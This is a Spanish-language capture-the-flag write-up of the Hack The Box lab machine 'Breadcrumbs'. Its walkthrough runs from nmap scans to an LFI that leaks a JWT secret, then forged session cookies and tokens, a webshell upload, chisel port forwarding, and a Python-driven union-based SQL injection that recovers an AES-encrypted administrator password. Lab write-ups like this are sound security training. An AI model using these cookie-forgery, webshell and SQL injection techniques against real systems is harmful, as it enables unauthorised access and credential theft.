---
layout: single
title: Breadcrumbs - Hack The Box
excerpt: "Breadcrumbs es una maquina de hackthebox calificada como dificil, que contiene un lfi que a traves de el logramos ejecutar un cookie manipulation, a lo cual nos convertimos en el usuario paul.Luego subimos un archivo php para ejecutar comandos en la maquina victima.Gracias a dicho archivo extraemos un usuario y una contraseña.Luego hacemos un poco de reversing basico y sacamos que en el puerto 1234, corre un servicio http que lo dirije root gracias a una inyeccion sql logramos sacar la password.Luego mediante cybercheff logramos desencriptarla"
date: 2022-09-13
classes: wide
header:
  teaser: /assets/images/htb-writeup-breadcrumbs/breadcrumbs_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - cxdxnt
tags:  
  -  cookie manipulation
  - sql injection
  - lfi
  - Reversing
---

![](/assets/images/htb-writeup-breadcrumbs/breadcrumbs_logo.png)

Breadcrumbs comienza con una cantidad de enumeración web. Primero filtramos la fuente de la página con una vulnerabilidad transversal de directorio y la usamos para obtener los algoritmos necesarios para falsificar tanto una cookie de sesión como un token JWT. Con ambas cookies, obtenemos acceso de administrador al sitio y podemos cargar una webshell después de omitir algunos filtros y Windows Defender. Encontrarémos los datos del próximo usuario en los archivos del sitio web. Encontrarémos otra contraseña en los datos de Sticky Notes que la usaré para obtener acceso al administrador de contraseñas en desarrollo. Para llegar al administrador, exploramos una inyección de SQL en el administrador de contraseñas para obtener la contraseña cifrada y el material clave para descifrarla, proporcionando la contraseña de administrador.

## Enumeración 
Empezamos con un simple nmap.

 ```bash
nmap -sCV -p22,135,139,445,3306,5040,49664,49665,49666,49667,49668,49669 10.10.10.228 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-10 22:31 -03
Stats: 0:02:24 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 91.67% done; ETC: 22:33 (0:00:13 remaining)
Stats: 0:02:29 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 91.67% done; ETC: 22:33 (0:00:13 remaining)
Nmap scan report for 10.10.10.228
Host is up (0.24s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA)
|   256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA)
|_  256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   DNSVersionBindReqTCP, FourOhFourRequest, Help, JavaRMI, Kerberos, LANDesk-RC, NCP, NotesRPC, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TerminalServerCookie, X11Probe, oracle-tns: 
|_    Host '10.10.14.8' is not allowed to connect to this MariaDB server
5040/tcp  open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.92%I=7%D=9/10%Time=631D3A70%P=x86_64-pc-linux-gnu%r(RT
SF:SPRequest,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.8'\x20is\x20not\x2
SF:0allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(DNSVer
SF:sionBindReqTCP,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.8'\x20is\x20n
SF:ot\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(H
SF:elp,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.8'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SSLSessionRe
SF:q,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.8'\x20is\x20not\x20allowed
SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TerminalServer
SF:Cookie,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.8'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Kerberos,
SF:49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.8'\x20is\x20not\x20allowed\x
SF:20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SMBProgNeg,49,"E
SF:\0\0\x01\xffj\x04Host\x20'10\.10\.14\.8'\x20is\x20not\x20allowed\x20to\
SF:x20connect\x20to\x20this\x20MariaDB\x20server")%r(X11Probe,49,"E\0\0\x0
SF:1\xffj\x04Host\x20'10\.10\.14\.8'\x20is\x20not\x20allowed\x20to\x20conn
SF:ect\x20to\x20this\x20MariaDB\x20server")%r(FourOhFourRequest,49,"E\0\0\
SF:x01\xffj\x04Host\x20'10\.10\.14\.8'\x20is\x20not\x20allowed\x20to\x20co
SF:nnect\x20to\x20this\x20MariaDB\x20server")%r(SIPOptions,49,"E\0\0\x01\x
SF:ffj\x04Host\x20'10\.10\.14\.8'\x20is\x20not\x20allowed\x20to\x20connect
SF:\x20to\x20this\x20MariaDB\x20server")%r(LANDesk-RC,49,"E\0\0\x01\xffj\x
SF:04Host\x20'10\.10\.14\.8'\x20is\x20not\x20allowed\x20to\x20connect\x20t
SF:o\x20this\x20MariaDB\x20server")%r(NCP,49,"E\0\0\x01\xffj\x04Host\x20'1
SF:0\.10\.14\.8'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x2
SF:0MariaDB\x20server")%r(NotesRPC,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.
SF:14\.8'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaD
SF:B\x20server")%r(JavaRMI,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.8'\x
SF:20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20ser
SF:ver")%r(oracle-tns,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.8'\x20is\
SF:x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-09-11T01:34:02
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.70 seconds
```

```bash
nmap --script http-enum -p80,443 10.10.10.228 -oN webscan
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-10 22:42 -03
Nmap scan report for 10.10.10.228
Host is up (0.23s latency).

PORT    STATE SERVICE
80/tcp  open  http
| http-enum: 
|   /db/: BlogWorx Database
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.46 (win64) openssl/1.1.1h php/8.0.1'
|   /db/: Potentially interesting directory w/ listing on 'apache/2.4.46 (win64) openssl/1.1.1h php/8.0.1'
|   /icons/: Potentially interesting folder w/ directory listing
|   /includes/: Potentially interesting directory w/ listing on 'apache/2.4.46 (win64) openssl/1.1.1h php/8.0.1'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.46 (win64) openssl/1.1.1h php/8.0.1'
|_  /php/: Potentially interesting directory w/ listing on 'apache/2.4.46 (win64) openssl/1.1.1h php/8.0.1'
443/tcp open  https
| http-enum: 
|   /db/: BlogWorx Database
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.46 (win64) openssl/1.1.1h php/8.0.1'
|   /db/: Potentially interesting directory w/ listing on 'apache/2.4.46 (win64) openssl/1.1.1h php/8.0.1'
|   /icons/: Potentially interesting folder w/ directory listing
|   /includes/: Potentially interesting directory w/ listing on 'apache/2.4.46 (win64) openssl/1.1.1h php/8.0.1'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.46 (win64) openssl/1.1.1h php/8.0.1'
|_  /php/: Potentially interesting directory w/ listing on 'apache/2.4.46 (win64) openssl/1.1.1h php/8.0.1'
```

Al parecer tanto http como https contiene lo mismo.Cuando apenas entramos nos dirigimos a check book en él procedemos a insertar un espacio y vemos lo siguiente.

![](/assets/images/htb-writeup-breadcrumbs/space.png)

Interceptamos la petición cuando hacemos click  en book y vemos que está llamando a un archivo de la web, probamos si nos permite leer archivos de la máquina.
![](/assets/images/htb-writeup-breadcrumbs/lfi.png)
## Lfi

Acá ocurre la parte más bonita de la máquina, ya que podemos acceder a cualquier archivo arbitrario de la máquina, procedemos a sacar el secreto del token y el algoritmo de la cookie.Mediante el lfi extraemos el archivo cookie.php y aplicamos una expresión regular para que quede más legible. Luego procedemos a poner nuestro nombre de usuario para validar si las cookie son correctas. Luego de esto solo hace falta poner el nombre de Paul y sacar el secreto del token.
```php
cat cookie.php| sed 's/\\n/\n/g' | sed 's/\\r/\r/' | sed 's/\\//g'| sponge  cookie.php

<?php
/**
 * @param string $username  Username requesting session cookie
 * 
 * @return string $session_cookie Returns the generated cookie
 * 
 * @devteam
 * Please DO NOT use default PHPSESSID; our security team says they are predictable.
 * CHANGE SECOND PART OF MD5 KEY EVERY WEEK
 * */
function makesession($username){
    $max = strlen($username) - 1;
    $seed = rand(0, $max);
    $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
    $session_cookie = $username.md5($key);

    return $session_cookie;
}
printf(makesession('cxdxnt'))
```
```bash
for i in $(seq 1 1000);do php cookie.php;echo ;done |sort -u
cxdxnt20f5f9dae8b59412f0299036c5f2b745
cxdxnt947ab86b9ef054a68e3da2d5098840b1
cxdxnta30a4c0fb9ebfe098db95c05562a3728
cxdxnte640846cb7f7acdbe36b4f006d12fb3e
cxdxnted1171965820e60be96065b58edd318a
```
Ya podemos generar una cookie como cualquier usuario que queramos, ahora vamos por el token.Logramos extraer el token gracias al archivo fileController.php que está en la ruta /portal/includes/fileController.php.

```php
<?php
$ret = "";
require "../vendor/autoload.php";
use FirebaseJWTJWT;
session_start();
function validate(){

    $ret = false;

    $jwt = $_COOKIE['token'];



    $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e'; #El secreto.

    $ret = JWT::decode($jwt, $secret_key, array('HS256'));   

    return $ret;

}

if($_SERVER['REQUEST_METHOD'] === "POST"){

    $admins = array("paul");

    $user = validate()->data->username;

    if(in_array($user, $admins) && $_SESSION['username'] == "paul"){

        error_reporting(E_ALL & ~E_NOTICE);

        $uploads_dir = '../uploads';

        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_POST['task'];

        if(move_uploaded_file($tmp_name, "$uploads_dir/$name")){

            $ret = "Success. Have a great weekend!";

        }     

        else{

            $ret = "Missing file or title :(" ;

        }

    }

    else{

        $ret = "Insufficient privileges. Contact admin or developer to upload code. Note: If you recently registered, please wait for one of our admins to approve it.";

    }

    echo $ret;
} 

```
Procedemos a insertar la cookie y el token de paul.

![](/assets/images/htb-writeup-breadcrumbs/manipulation-cookie.png)

Como el usuario Paul nos dirigimos a file management y vemos una subida de archivos. Procedemos a subir una webshell simple.
![](/assets/images/htb-writeup-breadcrumbs/cambio-de-archivo3.png)
A traves de la webshell logramos sacar la contraseña de juliette.
![](/assets/images/htb-writeup-breadcrumbs/password-de-juliette.png)

## Elevacion de privilegios

Al lado de la flag se presenta un archivo todo.html, buscamos si existe un backup de Store Sticky Notes y encontramos estos archivos.
![](/assets/images/htb-writeup-breadcrumbs/notes.png)

Mediante los archivos que se presentan logramos extraer la contraseña de develoment.
![](/assets/images/htb-writeup-breadcrumbs/ssh.png)

Como el usuario develoment, nos dirigimos a c:\Develoment y nos transferimos el archivo Krypter_Linux, Mediante el archivo Krypter_Linux logramos ver que como el usuario administrator ejecuta un servidor web en el puerto 1234. Mediante la herramienta chisel hacemos un port forwarding. En la web vemos esto.

![](/assets/images/htb-writeup-breadcrumbs/sql.png)

Nos creamos un script en python3 para hacer todo mas simple.

```python
#!/usr/bin/python3
def sqlinjection():
    q = input('sql_>')
    payload = urllib.parse.quote_plus(q)
    main_url="http://localhost:1234/index.php?method=select&username=administrator%s&table=passwords"%payload
    r = requests.get(main_url)
    print(r.text)
if __name__ == '__main__':
    import requests, urllib.parse
    while True:
        sqlinjection()
```
Esto consiste en una simple enumeración sql injection union based así que vamos directo al grano.Extraemos los que nos interesa y conseguimos esto.

```python
' union select concat(aes_key,'{space}',password,'{space}',account,'{space}',id) from bread.passwords-- -
selectarray(2) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
  [1]=>
  array(1) {
    ["aes_key"]=>
    string(95) "k19D193j.<19391({space}H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw={space}Administrator{space}1"
  }
}

sql_>
```
Mediante cybercheff desencriptamos la contraseña.Como el IV no se presenta en la inyeccion sql aplicamos relleno.
![](/assets/images/htb-writeup-breadcrumbs/password-decrypt.png)

Accedimos como root :).
```powershell

Microsoft Windows [Version 10.0.19041.746]
(c) 2020 Microsoft Corporation. All rights reserved.

administrator@BREADCRUMBS C:\Users\Administrator>type Desktop\root.txt
26b6eaebdc79e8a1e2c0d53136468cdb

administrator@BREADCRUMBS C:\Users\Administrator>
```

